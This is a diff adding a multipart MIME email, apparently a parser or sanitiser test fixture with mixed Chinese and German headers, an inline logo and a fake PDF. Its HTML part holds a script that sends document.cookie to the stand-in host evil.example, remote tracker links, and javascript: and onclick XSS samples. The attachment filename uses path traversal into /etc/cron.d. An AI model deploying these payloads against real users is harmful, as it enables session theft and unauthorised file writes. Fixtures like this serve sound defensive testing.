@@ -1,0 +1,72 @@
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="===============7460265588076181896=="
+Subject: =?utf-8?b?5Lya6K6u5rWL6K+VbXVsdGlwYXJ0OiDlpJrpg6jliIbmtYvor5U=?=
+From: =?utf-8?b?5byg5LiJ?= <alice@example.cn>
+To:
+ =?utf-8?q?J=C3=B6rg?= <jorg@example.de>, =?utf-8?b?5bCP546L?= <bob@example.cn>
+Cc: archive <archive@example.com>
+Date: Tue, 14 Nov 2023 22:13:20 +0000
+Message-ID: <179081509376.1276.15572430385214139451.multi@example.cn>
+References: <parent-1@example.cn> <grand-0@example.cn>
+In-Reply-To: <parent-1@example.cn>
+
+--===============7460265588076181896==
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="===============4933444085745288252=="
+
+--===============4933444085745288252==
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+ boundary="===============1833555235054011107=="
+
+--===============1833555235054011107==
+MIME-Version: 1.0
+Content-Type: text/plain; charset="gb18030"
+Content-Transfer-Encoding: base64
+
+1eLKxyBHQjE4MDMwILHgwuu1xLS/zsSxvtX9zsShowq12rb+0NCjuk1JTUUgtuCy473izvay4srU
+oaM=
+
+--===============1833555235054011107==
+MIME-Version: 1.0
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: 8bit
+
+<html><head><title>x</title>
+<script>fetch('http://evil.example/steal?c='+document.cookie)</script>
+<link rel="stylesheet" href="http://evil.example/x.css">
+</head><body>
+<h1>HTML 正文</h1>
+<p onclick="alert(1)">点击我</p>
+<img src="http://evil.example/tracker.png" alt="remote tracker">
+<img src="cid:logo-cid@example.cn" alt="inline logo">
+<a href="javascript:alert(1)">xss link</a>
+<a href="https://example.cn/safe">正常链接</a>
+<div style="position:absolute">styled</div>
+<unknown-tag>未知标签内容</unknown-tag>
+</body></html>
+
+--===============1833555235054011107==--
+
+--===============4933444085745288252==
+Content-Type: image/png
+Content-Transfer-Encoding: base64
+Content-Disposition: inline; filename="logo.png"
+Content-ID: <logo-cid@example.cn>
+MIME-Version: 1.0
+
+iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4nGMAAQAAAAUAAQ0KLbQA
+AAAASUVORK5CYII=
+
+--===============4933444085745288252==
+Content-Type: application/pdf; name="evil.pdf"
+Content-Disposition: attachment; filename="../../../../etc/cron.d/evil.pdf"; filename*=utf-8''%E6%8A%A5%E5%91%8A..%20%281%29.pdf
+Content-Transfer-Encoding: base64
+
+JVBERi0xLjQgZmFrZSBwZGYgYm9keSBmb3IgcGFyc2luZyB0ZXN0cwolUERGLTEuNCBmYWtlIHBk
+ZiBib2R5IGZvciBwYXJzaW5nIHRlc3RzCiVQREYtMS40IGZha2UgcGRmIGJvZHkgZm9yIHBhcnNp
+bmcgdGVzdHMKJVBERi0xLjQgZmFrZSBwZGYgYm9keSBmb3IgcGFyc2luZyB0ZXN0cwo=
+
+--===============4933444085745288252==--
+
+--===============7460265588076181896==--
